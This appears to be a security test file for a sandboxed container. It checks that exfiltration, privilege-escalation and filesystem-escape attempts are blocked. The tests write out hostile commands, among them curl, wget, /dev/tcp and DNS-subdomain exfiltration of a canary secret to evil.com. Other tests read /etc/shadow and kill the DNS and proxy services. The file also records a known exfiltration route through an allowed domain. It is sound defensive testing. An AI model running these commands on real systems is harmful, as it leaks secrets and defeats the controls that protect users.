import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import {
  cleanupProject,
  createTempProject,
  writeProjectFile,
} from "./utils/project.js";
import {
  createSandbox,
  isTransientNetworkFailure,
  type SandboxInstance,
} from "./utils/sandbox.js";

const DEMO_SECRET = "s3cr3t-exfil-canary";
const IP_ADDRESS_PATTERN = /(?:\d+\.\d+\.\d+\.\d+|[0-9a-f:]*:[0-9a-f:]+)/i;
const ALLOWED_RUNTIME_MOUNT_TARGETS = new Set([
  "/opt/sandbox-cli",
  "/run/.containerenv",
]);
const READ_ONLY_RUNTIME_MOUNT_TARGETS = new Set([
  "/dev/init",
  "/run/.containerinit",
  "/run/podman-init",
  "/usr/sbin/docker-init",
]);

function getMountTarget(line: string): string | null {
  const match = / on (.+?) type /.exec(line);
  return match?.[1] ?? null;
}

let projectDir: string;
let sb: SandboxInstance;

beforeAll(async () => {
  projectDir = await createTempProject("security");
  await writeProjectFile(
    projectDir,
    ".sandbox/config.toml",
    `allow_network = [
  "api.anthropic.com",
  "api.github.com",
]
full_network = false
`,
  );
  sb = createSandbox({ cwd: projectDir });
});

afterAll(async () => {
  await cleanupProject(projectDir, sb);
});

describe("security", () => {
  test("builds project and starts container", async () => {
    const result = await sb.run("true");
    expect(result.exitCode).toBe(0);
  }, 120_000);

  // Category 1: Network Egress — Direct HTTP/S Bypass
  describe("category 1: direct bypass", () => {
    test("direct curl to blocked domain", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        `curl --noproxy '*' -m 5 http://httpbin.org/post -d '${DEMO_SECRET}'`,
      );
      expect(exitCode).not.toBe(0);
    });

    test("direct curl to IP address", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        `curl --noproxy '*' -m 5 http://93.184.216.34/ -d '${DEMO_SECRET}'`,
      );
      expect(exitCode).not.toBe(0);
    });

    test("wget bypass attempt", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        `wget --no-proxy -O- -T5 http://httpbin.org/post --post-data='${DEMO_SECRET}' 2>&1`,
      );
      expect(exitCode).not.toBe(0);
    });

    test("netcat direct connection", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        "timeout 5 nc -w 2 93.184.216.34 80 </dev/null 2>&1",
      );
      expect(exitCode).not.toBe(0);
    });
  });

  // Category 2: Network Egress — Proxy Layer
  describe("category 2: proxy layer", () => {
    test("proxy to blocked domain", async () => {
      const { exitCode, stdout } = await sb.run(
        "sh",
        "-c",
        `curl -f -x http://127.0.0.1:8888 -m 5 'http://evil.com/exfil?d=${DEMO_SECRET}' 2>&1`,
      );
      const blocked =
        exitCode !== 0 || /403|Forbidden|denied|blocked|filter/i.test(stdout);
      expect(blocked).toBe(true);
    });

    test("proxy CONNECT to blocked domain", async () => {
      const { exitCode, stdout } = await sb.run(
        "sh",
        "-c",
        `curl -f -x http://127.0.0.1:8888 -m 5 https://evil.com/exfil 2>&1`,
      );
      const blocked =
        exitCode !== 0 || /403|Forbidden|denied|blocked|filter/i.test(stdout);
      expect(blocked).toBe(true);
    });

    test("proxy to IP (no domain)", async () => {
      const { exitCode, stdout } = await sb.run(
        "sh",
        "-c",
        `curl -f -x http://127.0.0.1:8888 -m 5 http://93.184.216.34/ 2>&1`,
      );
      const blocked =
        exitCode !== 0 || /403|Forbidden|denied|blocked|filter/i.test(stdout);
      expect(blocked).toBe(true);
    });
  });

  // Category 3: DNS Layer
  describe("category 3: DNS layer", () => {
    test("resolve blocked domain", async () => {
      const { exitCode } = await sb.run("getent", "hosts", "evil.com");
      expect(exitCode).not.toBe(0);
    });

    test("resolve allowed domain", async () => {
      const { exitCode, stdout, stderr } = await sb.run(
        "getent",
        "hosts",
        "api.anthropic.com",
      );

      // Allow transient network failures as known flakes
      if (isTransientNetworkFailure(exitCode, stdout + stderr)) {
        console.warn(
          "KNOWN: transient network failure resolving api.anthropic.com",
        );
        return;
      }

      expect(exitCode).toBe(0);
      expect(stdout).toMatch(IP_ADDRESS_PATTERN);
    });

    test("subdomain of allowed domain", async () => {
      const { stdout } = await sb.run(
        "sh",
        "-c",
        "getent hosts secret-data.github.com 2>&1 || echo 'blocked'",
      );
      expect(stdout).toMatch(
        /blocked|(?:\d+\.\d+\.\d+\.\d+|[0-9a-f:]*:[0-9a-f:]+)/i,
      );
    });

    test("DNS subdomain exfiltration", async () => {
      const { exitCode } = await sb.run(
        "getent",
        "hosts",
        `${DEMO_SECRET}.evil.com`,
      );
      expect(exitCode).not.toBe(0);
    });
  });

  // Category 4: Alternate Protocol Exfiltration
  describe("category 4: alternate protocols", () => {
    test("raw TCP to arbitrary port", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        `timeout 5 bash -c 'echo ${DEMO_SECRET} > /dev/tcp/93.184.216.34/9999' 2>&1`,
      );
      expect(exitCode).not.toBe(0);
    });

    test("ICMP ping blocked", async () => {
      const { exitCode } = await sb.run(
        "ping",
        "-c",
        "1",
        "-W",
        "2",
        "8.8.8.8",
      );
      expect(exitCode).not.toBe(0);
    });

    test("SSH to non-allowed host", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        "timeout 5 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no user@evil.com 2>&1",
      );
      expect(exitCode).not.toBe(0);
    });
  });

  // Category 5: Privilege Escalation
  describe("category 5: privilege escalation", () => {
    test("sudo access denied", async () => {
      const { exitCode } = await sb.run("sh", "-c", "sudo id 2>&1");
      expect(exitCode).not.toBe(0);
    });

    test("su to root denied", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        "echo '' | su -c id root 2>&1",
      );
      expect(exitCode).not.toBe(0);
    });

    test("iptables modification denied", async () => {
      const { exitCode } = await sb.run("sh", "-c", "iptables -L 2>&1");
      expect(exitCode).not.toBe(0);
    });

    test("resolv.conf modification denied", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        "echo 'nameserver 8.8.8.8' > /etc/resolv.conf 2>&1",
      );
      expect(exitCode).not.toBe(0);
    });

    test("kill dnsmasq denied", async () => {
      const { exitCode } = await sb.run("sh", "-c", "killall dnsmasq 2>&1");
      expect(exitCode).not.toBe(0);
    });

    test("kill squid denied", async () => {
      const { exitCode } = await sb.run("sh", "-c", "killall squid 2>&1");
      expect(exitCode).not.toBe(0);
    });

    test("write proxy filter denied", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        "echo '.*' >> /var/run/proxy-filter.txt 2>&1",
      );
      expect(exitCode).not.toBe(0);
    });
  });

  // Category 6: Filesystem Escape
  describe("category 6: filesystem escape", () => {
    test("read /etc/shadow denied", async () => {
      const { exitCode } = await sb.run("sh", "-c", "cat /etc/shadow 2>&1");
      expect(exitCode).not.toBe(0);
    });

    test("list /root/ denied", async () => {
      const { exitCode } = await sb.run("sh", "-c", "ls /root/ 2>&1");
      expect(exitCode).not.toBe(0);
    });

    test("Docker socket not accessible", async () => {
      const { exitCode } = await sb.run(
        "sh",
        "-c",
        "ls /var/run/docker.sock 2>&1",
      );
      expect(exitCode).not.toBe(0);
    });

    test("no unexpected mount points", async () => {
      const { stdout } = await sb.run("mount");
      const allowedTargetPrefixes = [
        projectDir,
        "/workspace",
        "/var/cache",
        "/home/sandbox",
        "/etc/sandbox",
      ];
      const allowedFilesystemTypes = new Set([
        "cgroup",
        "cgroup2",
        "devpts",
        "devtmpfs",
        "mqueue",
        "overlay",
        "proc",
        "sysfs",
        "tmpfs",
        "virtiofs",
      ]);

      const unexpected = stdout
        .trim()
        .split("\n")
        .filter((line) => line.trim())
        .filter((line) => {
          const target = getMountTarget(line);
          if (!target) return true;
          if (READ_ONLY_RUNTIME_MOUNT_TARGETS.has(target)) {
            return !/\(ro(?:,|\))/.test(line);
          }
          if (ALLOWED_RUNTIME_MOUNT_TARGETS.has(target)) return false;
          if (
            allowedTargetPrefixes.some((prefix) => target.startsWith(prefix))
          ) {
            return false;
          }
          if (
            ["/etc/hosts", "/etc/hostname", "/etc/resolv.conf"].includes(target)
          ) {
            return false;
          }
          return ![...allowedFilesystemTypes].some((type) =>
            line.includes(` type ${type} `),
          );
        });
      if (unexpected.length > 0) {
        throw new Error(`Unexpected mount points:\n${unexpected.join("\n")}`);
      }
    });

    test("proc/1/environ not readable", async () => {
      const { exitCode } = await sb.run("sh", "-c", "cat /proc/1/environ 2>&1");
      expect(exitCode).not.toBe(0);
    });
  });

  // Category 7: Private Network Access — Known Allowed
  describe("category 7: private network (known allowed)", () => {
    test("reach Docker host (allowed by design)", async () => {
      const { exitCode, stdout, stderr } = await sb.run(
        "sh",
        "-c",
        "timeout 3 curl -m 2 http://host.docker.internal:80/ 2>&1",
      );
      // Known allowed — but tolerate transient failures
      if (isTransientNetworkFailure(exitCode, stdout + stderr)) {
        console.warn("KNOWN: transient network failure reaching Docker host");
        return;
      }
      expect(exitCode).toBe(0);
    });
  });

  // Category 8: Exfiltration via Allowed Domains — Known Limitation
  describe("category 8: allowed domain exfiltration (known limitation)", () => {
    test("POST to allowed API (known limitation)", async () => {
      const { exitCode, stdout, stderr } = await sb.run(
        "sh",
        "-c",
        `curl -m 5 https://api.github.com/ -d '${DEMO_SECRET}' 2>&1 | head -1`,
      );
      // Known limitation — tolerate transient failures
      if (isTransientNetworkFailure(exitCode, stdout + stderr)) {
        console.warn(
          "KNOWN: transient network failure reaching api.github.com",
        );
        return;
      }
      expect(exitCode).toBe(0);
    }, 60_000);
  });
});
